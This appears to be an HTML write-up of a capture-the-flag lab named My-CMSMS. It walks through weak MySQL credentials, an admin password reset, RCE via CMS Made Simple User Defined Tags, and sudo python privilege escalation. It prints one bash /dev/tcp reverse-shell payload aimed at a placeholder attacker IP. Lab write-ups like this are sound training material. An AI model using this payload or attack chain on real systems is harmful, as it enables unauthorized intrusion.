@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <title></title>
+    <style>
+        body {
+            text-align: center;
+            color: black;
+            background-color: whitesmoke;
+        }
+        img {
+            width: 50%;
+            height: 50%;
+        }
+        p {
+            padding-left: 25%;
+            padding-right: 25%;
+            text-align: left;
+        }
+    </style>
+</head>
+
+<body>
+    <h1>My-CMSMS</h1>
+    <h2>About This Lab</h2>
+    <p>In this lab, attackers first exploit a weak MySQL root password to access the database. By resetting the CMS
+        admin password directly in the database, they gain administrative access to the CMS MS portal. A Remote Code
+        Execution (RCE) vulnerability is leveraged through User Defined Tags to achieve a shell. Privilege escalation is
+        then completed by recovering encoded credentials and exploiting misconfigured sudo permissions on the
+        /usr/bin/python binary to obtain root access.</p>
+    <h2>Recon</h2>
+    <p>Nmap scanning the given IP shows us:</p>
+    <img src="img/1.png" alt="1">
+    <img src="img/2.png" alt="2">
+    <p>We see there are four ports open, 22 — ssh, 80 — http, 3306 — mysql and 33060 — mysqlx. Since we don't see
+        anything out of the ordinary with the ports and no given creds, lets check out port 80.</p>
+    <h2>Port 80</h2>
+    <p>We are greeted with a website made with CMS.</p>
+    <img src="img/3.png" alt="3">
+    <p>Exploring the website does yield too much but a bunch of info about CMS but two things. There is a link to a
+        login page, and we are given the version CMS is running. The login page for now is not useful since we
+        don't have creds and testing common defaults like admin:admin did not work. <br> <br>
+        Doing some quick google on the CMS version leads me to a PDF on
+        <a href="https://www.exploit-db.com/docs/49947">exploit-db</a>. <br> <br>
+        From their exploitation they connected to the sql database, which we shall do then. Since they were able to
+        access without much problem, we can guess their password was not too complex. After a few tries, we are in.</p>
+    <img src="img/4.png" alt="4">
+    <p>Let's poke around the database.</p>
+    <img src="img/5.png" alt="5">
+    <p>We can see there are 5 databases, but the one that stands out is cmsms_db. Going into and showing the table gives
+        us a big list. In the big list cm_users seem pretty promising.</p>
+    <img src="img/6.png" alt="6">
+    <img src="img/7.png" alt="7">
+    <p>We now know what the username is, admin and a password in the hashed form. Let's check if crackstation had the
+        decrypted password.</p>
+    <img src="img/8.png" alt="8">
+    <p>Ok, what about john, that also failed. Alright, if we cant crack it can we change it?
+        Yes, from the csm <a href="https://cmscanbesimple.org/blog/cms-made-simple-admin-password-recovery">reset-page
+        </a> it shows how to change the password. </p>
+    <img src="img/9.png" alt="9">
+    <p>Lets login through the link we found on the main webpage.</p>
+    <img src="img/10.png" alt="10">
+    <p>We are now in WOOWOO! <br>
+        Now the main exploit of version 2.2.13 from the report was User Defined Tags. </p>
+    <img src="img/11.png" alt="11">
+    <p>We can do a quick reverse shell by pasting the command in user_agent: <br>
+        system("bash -c 'bash -i >& /dev/tcp/UR IP/PORT 0>&1'"); <br>
+        Click apply and then run and boom
+    </p>
+    <img src="img/12.png" alt="12">
+    <p>WE ARE IN <br>
+        Do some shell stabilization to get the good one, and now it's time to hunt for the first flag and ways to get into
+        a more privileged user. <br>
+        Poking around the first flag can be found two directories back.</p>
+    <img src="img/13.png" alt="13">
+    <h2>Getting Into User</h2>
+    <p>Let's go back to where they put us in first and see if there is anything interesting.</p>
+    <img src="img/14.png" alt="14">
+    <p>We see a hidden file named htpasswd, which should sounds some alarm bells. Catting the fill shows us a hashed
+        string, which I assume is a password of sorts.</p>
+    <img src="img/15.png" alt="15">
+    <p>Let's try to decrypt the hash first, pasting into cyberchef it suggest using base64 first, which turns into another
+        hash, which used base32 to turn into the final string with the username and password. <br> <br>
+        armour:----------- <br> <br>
+        Trying to ssh in we get block pretty hard so lets try su instead.</p>
+    <img src="img/16.png" alt="16">
+    <p>BEANS, lets see what these users have access to.</p>
+    <img src="img/17.png" alt="17">
+    <p>We have access to some big stuff <br>
+        We can check the GTFObins for python and scroll to the sudo section and paste that in to escalate our
+        privileges.</p>
+    <img src="img/19.png" alt="19">
+    <p>BOOM!</p>
+    <img src="img/20.png" alt="20">
+    <p>WE ARE DONE!</p>
+</body>
+</html>
